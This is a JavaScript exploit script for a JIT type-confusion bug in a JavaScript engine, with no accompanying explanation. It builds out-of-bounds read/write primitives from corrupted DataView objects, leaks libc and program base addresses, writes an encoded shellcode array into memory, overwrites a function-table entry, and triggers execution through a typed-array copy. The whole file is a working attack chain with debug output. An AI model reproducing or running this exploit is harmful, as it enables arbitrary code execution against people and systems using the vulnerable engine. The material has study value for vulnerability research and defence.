obj = {}
obj.a = 1;
obj.b = 2;
obj.c = 3;
obj.d = 4;
obj.e = 5;
obj.f = 6;
obj.g = 7;
obj.h = 8;
obj.i = 9;
obj.j = 10;

dv1 = new DataView(new ArrayBuffer(0x100));
dv2 = new DataView(new ArrayBuffer(0x100));
dv2.setUint32(0, 0xdead,true);
BASE = 0x100000000;


let wasm_code = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 7, 1, 96, 2, 127, 127, 1, 127, 3, 2, 1, 0, 4, 4, 1, 112, 0, 0, 5, 3, 1, 0, 1, 7, 21, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 8, 95, 90, 51, 97, 100, 100, 105, 105, 0, 0, 10, 9, 1, 7, 0, 32, 1, 32, 0, 106, 11]);
let wasm_mod = new WebAssembly.Instance(new WebAssembly.Module(wasm_code), {});
let f = wasm_mod.exports._Z3addii;


function hex(x) {
    return "0x" + x.toString(16);
}

function opt(o, proto, value) {
    o.b = 1;

    let tmp = {__proto__: proto};

    o.a = value;
}

function main() {
    for (let i = 0; i < 2000; i++) {
        let o = {a: 1, b: 2};
        opt(o, {}, {});
    }

    let o = {a: 1, b: 2};

    opt(o, o, obj);

    o.c = dv1
    obj.h = dv2;

    let read64 = function(addr_lo, addr_hi) {
        // dv2->buffer = addr (Step 4)
        dv1.setUint32(0x38, addr_lo, true);
        dv1.setUint32(0x3C, addr_hi, true);

        // read from addr (Step 5)
        return dv2.getInt32(0, true) + dv2.getInt32(4, true) * BASE;
    }

    let write64 = function(addr_lo, addr_hi, value_lo, value_hi) {
        // dv2->buffer = addr (Step 4)
        dv1.setUint32(0x38, addr_lo, true);
        dv1.setUint32(0x3C, addr_hi, true);

        // write to addr (Step 5)
        dv2.setInt32(0, value_lo, true);
        dv2.setInt32(4, value_hi, true);
    }

    // get dv2 vtable pointer
    vtable_lo = dv1.getUint32(0, true);
    vtable_hi = dv1.getUint32(4, true);

    let libc_addr = vtable_lo + vtable_hi * BASE
    let libc_base = libc_addr-(0x7ffff49e95e0-0x00007ffff3c00000)
    let memove_got_addr = libc_base+0xe38128 
    print("[+] dv2.vtable pointer: "+hex(vtable_lo + vtable_hi * BASE));
    print("[+] libc base: "+hex(libc_base));
    print("[+] memmove got addr: "+hex(memove_got_addr));
    
    //get dv2 buffer poointer
    buf_lo=dv1.getUint32(0x38,true)
    buf_hi=dv1.getUint32(0x3C,true)
    let shelladdr = buf_lo + buf_hi * BASE
    let shellbase = shelladdr-(0x555555847360-0x00005555557d0000)
    // read first vtable entry using the R\W primitive
    print("[+] dv2.vtable content: "+hex(shelladdr));
    print("[+] shellbase: "+hex(shellbase))

    print("[+] dv2.buffer pointer: "+hex(libc_addr));
    // [+] dv2.vtable pointer: 0x7ffff49e95e0
    // [+] dv2.buffer pointer: 0x555555847360
    // [+] dv2.vtable content: 0x7ffef3d9a8e0
    // read first vtable entry using the R\W primitive
    print("[+] dv2.buffer content: "+hex(read64(buf_lo, buf_hi)));

    // write memove got
    // var shellcode = [0xb848686a,0x6e69622f,0x732f2f2f,0xe7894850,0x1697268,0x24348101,0x1010101,0x6a56f631,0x1485e08,0x894856e6,0x6ad231e6,0x50f583b];
    var shellcode = [
    '0x48c93148', '0xfff3e981', '0x8d48ffff', '0xffffef05', '0x5abb48ff', '0x188a8de0', '0x485316ef', '0x48275831', 
    '0xfffff82d', '0x30f4e2ff', '0x5013d5db', '0x33313954', '0x70f9a28e', '0xd31b45ef', '0x7ba7e507', '0xd31b16ef', 
    '0x2262df06', '0x385316ef', '0x38e2fe81', '0x7d7375c2', '0x76e3efcf', '0x7a3b65c0', '0x3eaae4cd', '0x3f3739d1', 
    '0x7bfea296', '0x6a62399f', '0x2ab8a3d4', '0x6f6238da', '0x20bba3d4', '0x696739d7', '0x28aabcd2', '0x7d6230d1', 
    '0x50dddbe0', '0x5f5cf066', '0x188a8de0', '0x5316ef'] ;   
    print("shellcode len"+hex(shellcode.length))
    // print("[+] shellcode: "+hex(shellcode[0]));
    let offset = 0x400
    for (var i = 0; i < 18; ++i) {
        write64(buf_lo+offset+i*8,buf_hi,shellcode[i*2],shellcode[i*2+1]);
    }
    
    write64(vtable_lo+0x4eb48,vtable_hi,buf_lo+offset,buf_hi)
//trigger 
    var target = new Uint8Array(0x1234); 
    var bb = new Uint8Array(10); 
    target.set(bb); 
}

main();
